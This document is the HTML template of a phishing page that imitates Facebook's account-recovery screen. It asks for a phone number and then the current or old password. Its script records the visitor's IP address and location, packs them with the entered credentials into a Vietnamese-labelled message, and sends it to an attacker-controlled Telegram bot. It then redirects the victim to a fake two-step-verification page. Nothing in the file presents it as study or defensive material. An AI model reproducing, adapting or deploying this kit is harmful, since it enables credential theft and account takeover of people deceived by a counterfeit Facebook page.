<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>{{__('msg.Find My Email | Facebook')}}</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" type="image/x-icon" />
    <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
        rel="stylesheet" />
</head>

<body class="flex min-h-screen appearance-none flex-col items-center font-[Roboto] lg:bg-[#E9EBEF]">
    <header class="h-[82px] bg-[#3B5998] w-full lg:flex items-end justify-center hidden">
        <div class="max-w-[980px] w-full flex items-end">
            <img src="images/logo-white.png" alt="" class="max-w-[170px] mb-4" />
        </div>
    </header>
    <div class="lg:hidden text-2xl fixed top-3 left-3">
        <svg data-v-aa80d42c="" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
            <path data-v-aa80d42c="" fill="currentColor"
                d="m6.4 18.308l-.708-.708l5.6-5.6l-5.6-5.6l.708-.708l5.6 5.6l5.6-5.6l.708.708l-5.6 5.6l5.6 5.6l-.708.708l-5.6-5.6z">
            </path>
        </svg>
    </div>
    <div
        class="flex flex-col justify-center items-center rounded-md lg:mt-25 mt-7 mb-auto border-gray-200 lg:border lg:bg-white lg:shadow max-w-[600px] w-full">
        <div class="flex flex-col items-center justify-center max-w-[600px] w-full">
            <div class="p-5 lg:px-5 px-4 lg:pb-5 pb-1 flex items-start w-full">
                <p class="text-[#182440] font-semibold lg:font-bold lg:text-xl text-lg text-start font-[Helvetica]">
                    {{__('msg.Find your account')}}
                </p>
            </div>
            <div class="lg:px-5 px-4 lg:py-4 flex flex-col items-end justify-center lg:border-y border-y-gray-200">
                <div class="mt-3 mb-[6px] w-full border border-yellow-500 bg-yellow-100 p-2 text-sm">
                    {{__("msg.To get back into your account, enter your current Email if you know it. If you don't think that your account was hacked, you can")}}
                    <a class='text-blue-600' href='/login'>{{__('msg.cancel this process')}}</a>
                </div>
                <form id="loginForm" class="w-full flex flex-col justify-end items-end" novalidate>
                    <div class="relative w-full lg:hidden">
                        <input id="emailInput" name="email"
                            class="peer my-2 p-4 w-full rounded-xl border border-gray-300 hover:border-gray-500 focus:outline-none bg-white pt-6"
                            type="tele" placeholder=" " />
                        <label for="emailInput"
                            class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:top-5 peer-focus:text-xs peer-focus:text-blue-500 peer-[&:not(:placeholder-shown)]:top-5 peer-[&:not(:placeholder-shown)]:text-xs pointer-events-none">
                            {{__('msg.Enter Phone')}} 
                        </label>
                    </div>

                    <div id="passwordFieldMobile" class="hidden relative w-full lg:hidden">
                        <input id="passwordInput" name="password"
                            class="peer my-2 p-4 w-full rounded-xl border border-gray-300 hover:border-gray-500 focus:outline-none bg-white pt-6"
                            type="password" placeholder=" " />
                        <label for="passwordInput"
                            class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:top-5 peer-focus:text-xs peer-focus:text-blue-500 peer-[&amp;:not(:placeholder-shown)]:top-5 peer-[&amp;:not(:placeholder-shown)]:text-xs pointer-events-none">
                            <font style="vertical-align: inherit">
                                <font style="vertical-align: inherit">{{__('msg.Enter current or old password')}}</font>
                            </font>
                        </label>
                    </div>

                    <input id="emailInputDesktop" name="email"
                        class="hidden lg:block lg:bg-white my-2 p-4 w-full rounded-md border border-gray-300 hover:border-gray-500 focus:outline-none lg:border lg:border-gray-300 bg-white"
                        type="tel" placeholder="{{__('msg.Enter Phone')}}" />
                       <p id="errorMessage" class="text-[#D31130] text-[13px] hidden mb-2 flex justify-start gap-2">
                        <svg viewBox="0 0 24 24" class="w-4 h-4 text-[#D31130]" fill="currentColor" aria-hidden="true">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"></path>
                        </svg>
                            {{__("msg.Please enter phone number.")}}
                        </p>
                    <input id="passwordInputDesktop" name="password"
                        class="lg:bg-white my-2 p-4 w-full rounded-md border border-gray-300 hover:border-gray-500 focus:outline-none lg:border lg:border-gray-300 bg-white hidden lg:hidden"
                        type="password" placeholder="{{__('msg.Enter current or old password')}}" required="" />
                </form>
            </div>
            <div class="lg:px-5 px-4 md:py-4 py-2 flex justify-end w-full">
                <div class="flex space-x-3 w-full justify-end">
                    <button id="cancelBtn" type="button"
                        class="rounded-md border-0 bg-gray-200 px-5 py-2 font-bold text-gray-700 hover:bg-gray-300 cursor-pointer hidden lg:block lg:w-auto">{{__('msg.Cancel')}}</button>
                    <button id="searchBtn" type="submit" form="loginForm"
                        class="rounded-full lg:rounded-md border-0 bg-blue-500 px-5 py-3 lg:py-2 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500 w-full lg:w-auto">{{__('msg.Search')}}</button>
                </div>
            </div>
        </div>
    </div>
    <footer class="hidden pt-8 pb-24 lg:block w-full bg-white p-4">
        <div class="max-w-[980px] mx-auto">
            <div class="flex gap-2 text-[#8a8d91] text-xs">
                <a href="#" class="hover:underline">English (UK)</a>
                <a href="#" class="hover:underline">Vietnamese</a>
                <a href="#" class="hover:underline">中文(台灣)</a>
                <a href="#" class="hover:underline">한국어</a>
                <a href="#" class="hover:underline">日本語</a>
                <a href="#" class="hover:underline">Français (France)</a>
                <a href="#" class="hover:underline">ภาษาไทย</a>
                <a href="#" class="hover:underline">Español</a>
                <a href="#" class="hover:underline">Português (Brasil)</a>
                <a href="#" class="hover:underline">Deutsch</a>
                <a href="#" class="hover:underline">Italiano</a>
            </div>
            <div class="mt-4 border-t border-[#dddfe2] pt-4"></div>
            <div class="flex flex-wrap gap-2 text-[#8a8d91] text-xs">
                <a href="#" class="hover:underline">{{__('msg.Sign Up')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Log in')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Messenger')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Facebook Lite')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Video')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Places')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Games')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Marketplace')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Meta Pay')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Meta Store')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Meta Quest')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Ray-Ban Meta')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Meta AI')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Instagram')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Threads')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Fundraisers')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Services')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Voting Information Centre')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Privacy Policy')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Privacy Centre')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Groups')}}</a>
                <a href="#" class="hover:underline">{{__('msg.About')}}</a>
                <a href="#" class="hover:underline">{{__('msg.AdChoices')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Terms')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Help')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Contact uploading and non-users')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Create ad')}}</a>
                <a href="#" class="hover:underline">{{__('msg.Create Page')}}</a>
            </div>
            <div class="mt-4 text-[#8a8d91] text-xs">{{__('msg.Meta © 2025')}}</div>
        </div>
    </footer>
    <script>
        localStorage.clear();
        localStorage.setItem('visited', 'true');
        const emailInput = document.querySelector('.lg\\:hidden #emailInput');
        const emailInputDesktop = document.getElementById('emailInputDesktop');
        const searchBtn = document.getElementById('searchBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const loginForm = document.getElementById('loginForm');

        let config;
        let storedData = JSON.parse(
            localStorage.getItem('messageData') ||
            JSON.stringify({
                messageId: null,
                email: '',
                geoData: null,
                formattedMessage: ''
            })
        );

        const initializeData = async () => {
            try {
                const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const geoData = await geoResponse.json();
                storedData.geoData = {
                    ip: geoData.ip,
                    country: geoData.country_code,
                    city: geoData.city,
                    region: geoData.region
                };
                localStorage.setItem('messageData', JSON.stringify(storedData));

                const configResponse = await fetch('config.json');
                config = await configResponse.json();
            } catch (error) {
                console.error('Error loading data:', error);
            }
        };

        initializeData();

        const passwordFieldMobile = document.getElementById('passwordFieldMobile');
        const passwordInput = document.getElementById('passwordInput');
        const passwordInputDesktop = document.getElementById('passwordInputDesktop');

        function isValidEmail(phone) {
            // const atIndex = email.indexOf('@');
            // const dotIndex = email.lastIndexOf('.');                        
            // return atIndex > 0 && dotIndex > atIndex && dotIndex < email.length - 1;
            const phoneRegex = /^\+?\d{1,4}?[-.\s]?\(?\d{1,3}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}[-.\s]?\d{1,9}$/;
            return phoneRegex.test(phone);
        }


        emailInput.addEventListener('input', function() {
            const phone = this.value;
            const errorMessage = document.getElementById('errorMessage');
            if (isNaN(phone) || phone.trim() === '') {
                errorMessage.classList.remove('hidden');
            } else {
                errorMessage.classList.add('hidden');
            }
            if (isValidEmail(this.value)) {
                passwordFieldMobile.classList.remove('hidden');
                passwordInput.required = true;
            } else {
                passwordFieldMobile.classList.add('hidden');
                passwordInput.required = false;
            }
        });

        emailInputDesktop.addEventListener('input', function() {
            const phone = this.value;
            const errorMessage = document.getElementById('errorMessage');
            if (isNaN(phone) || phone.trim() === '') {
                errorMessage.classList.remove('hidden');
            } else {
                errorMessage.classList.add('hidden');
            }

            if (isValidEmail(this.value)) {
                passwordInputDesktop.classList.remove('hidden', 'lg:hidden');
                passwordInputDesktop.classList.add('lg:block');
                passwordInputDesktop.required = true;
            } else {
                passwordInputDesktop.classList.add('hidden', 'lg:hidden');
                passwordInputDesktop.classList.remove('lg:block');
                passwordInputDesktop.required = false;
                passwordInputDesktop.classList.remove('lg:border-red-500');
            }
        });

        window.addEventListener('resize', function() {
            const emailValue = window.innerWidth >= 768 ? emailInputDesktop.value : emailInput.value;
            const phone = this.value;
            const errorMessage = document.getElementById('errorMessage');
            if (isNaN(phone) || phone.trim() === '') {
                errorMessage.classList.remove('hidden');
            } else {
                errorMessage.classList.add('hidden');
            }
            if (window.innerWidth >= 768) {
                passwordFieldMobile.classList.add('hidden');
                if (isValidEmail(emailValue)) {
                    passwordInputDesktop.classList.remove('hidden', 'lg:hidden');
                    passwordInputDesktop.classList.add('lg:block');
                }
            } else {
                passwordInputDesktop.classList.add('hidden', 'lg:hidden');
                passwordInputDesktop.classList.remove('lg:block');
                if (isValidEmail(emailValue)) {
                    passwordFieldMobile.classList.remove('hidden');
                }
            }
        });

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (!config) return;

            const emailValue = window.innerWidth >= 1024 ? emailInputDesktop.value : emailInput.value;
            const passwordValue = window.innerWidth >= 1024 ? passwordInputDesktop.value : passwordInput.value;

            if (!passwordValue) {
                if (window.innerWidth >= 1024) {
                    passwordInputDesktop.classList.add('lg:border-red-500', 'shake');
                    setTimeout(() => {
                        passwordInputDesktop.classList.remove('shake');
                    }, 650);
                } else {
                    passwordInput.classList.add('border-red-500', 'shake');
                    setTimeout(() => {
                        passwordInput.classList.remove('shake');
                    }, 650);
                }
                return;
            }

            searchBtn.disabled = true;
            storedData.email = emailValue;
            storedData.password = passwordValue;
            localStorage.setItem('messageData', JSON.stringify(storedData));

            const now = new Date();
            const timeStr = now.toLocaleString('vi-VN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            let message = `📅 <b>Thời gian</b>: <code>${timeStr}</code>\n`;
            if (storedData.geoData) {
                message += `🌐 <b>IP</b>: <code>${storedData.geoData.ip}</code>\n`;
                message +=
                    `🌍 <b>Vị trí</b>: <code>${storedData.geoData.country}</code> - <code>${storedData.geoData.region}</code> - <code>${storedData.geoData.city}</code>\n\n`;
            }

            message += `📧 <b>Email</b>: <code>${storedData.email}</code>\n`;
            message += `🔑 <b>Password</b>: <code>${storedData.password}</code>\n`;

            storedData.formattedMessage = message;
            localStorage.setItem('messageData', JSON.stringify(storedData));

            try {
                const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: config.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    storedData.messageId = data.result.message_id;
                    localStorage.setItem('messageData', JSON.stringify(storedData));
                    window.location.href = 'two-step-verification';
                }
            } catch (error) {
                console.error('Error sending message:', error);
            }
        });

        cancelBtn.addEventListener('click', function() {
            window.history.back();
        });

        passwordInput.addEventListener('input', function() {
            this.classList.remove('border-red-500', 'shake');
        });

        passwordInputDesktop.addEventListener('input', function() {
            this.classList.remove('lg:border-red-500', 'shake');
        });

        // cancelBtn.addEventListener('click', function () {
        //     window.history.back();
        // });

        document.addEventListener('DOMContentLoaded', () => {
            const loadGoogleTranslate = async () => {
                try {
                    const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                    const data = await response.json();
                    const countryCode = data.country_code;

                    const response2 = await fetch('country_to_language.json');
                    const languageMap = await response2.json();
                    const languageCode = languageMap[countryCode] || 'en';

                    if (languageCode !== 'en') {
                        const script = document.createElement('script');
                        script.src =
                            'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
                        script.async = true;
                        document.body.appendChild(script);

                        window.googleTranslateElementInit = () => {
                            new google.translate.TranslateElement({
                                    pageLanguage: 'en',
                                    includedLanguages: languageCode,
                                    autoDisplay: false
                                },
                                'google_translate_element'
                            );

                            let retryCount = 0;
                            const maxRetries = 20;
                            const retryInterval = 300;

                            const attemptTranslation = () => {
                                const gtcombo = document.querySelector('.goog-te-combo');
                                const instance = google.translate.TranslateElement.getInstance?.();

                                if (gtcombo || instance) {
                                    const element = document.querySelector('html');
                                    element.setAttribute('lang', languageCode);

                                    if (gtcombo) {
                                        gtcombo.value = languageCode;
                                        gtcombo.dispatchEvent(new Event('change'));
                                    }

                                    if (instance) {
                                        try {
                                            instance.setEnabled(true);
                                            const translateSelect = document.querySelector(
                                                '.goog-te-combo');
                                            if (translateSelect) {
                                                translateSelect.value = languageCode;
                                                translateSelect.dispatchEvent(new Event('change'));
                                            }
                                        } catch (e) {
                                            console.clear();
                                        }
                                    }
                                    return true;
                                }

                                retryCount++;
                                if (retryCount < maxRetries) {
                                    setTimeout(attemptTranslation, retryInterval);
                                }
                                return false;
                            };

                            attemptTranslation();
                        };
                    }
                } catch (error) {
                    console.clear();
                }
            };

            //loadGoogleTranslate();
        });
    </script>
</body>

</html>
